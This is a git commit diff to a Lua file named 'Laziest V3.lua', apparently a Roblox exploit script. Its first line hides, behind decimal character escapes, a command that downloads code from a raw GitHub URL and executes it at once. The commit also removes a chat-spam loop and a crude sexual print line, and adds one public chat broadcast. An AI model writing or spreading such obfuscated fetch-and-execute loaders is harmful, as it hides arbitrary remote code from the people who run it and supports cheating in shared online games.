98c90d92eba0996aefe2178d66263079af611d46
SxripterRar <makassaropenn@gmail.com>
2024-08-25 11:58:43 +0800

    Update Laziest V3.lua

--- Laziest V3.lua
+++ Laziest V3.lua
@@ -1,7 +1,2 @@
 loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\70\108\97\118\111\114\89\84\47\84\104\101\45\108\97\122\121\45\79\78\69\47\109\97\105\110\47\77\97\100\101\37\50\48\98\121\37\50\48\108\101\97\107\122\37\50\48\97\110\100\37\50\48\69\118\105\108\65\108\105\101\110\87\97\114\101\34\41\41\40\41\59")()
-local i = 1
-while i <= 10 do
-    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Lad- i mean LAZIEST V3 LOADED", "All")
-    i = i + 1
-end
-print("wanna sex ?")
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Laziest v3 Loaded.", "All")
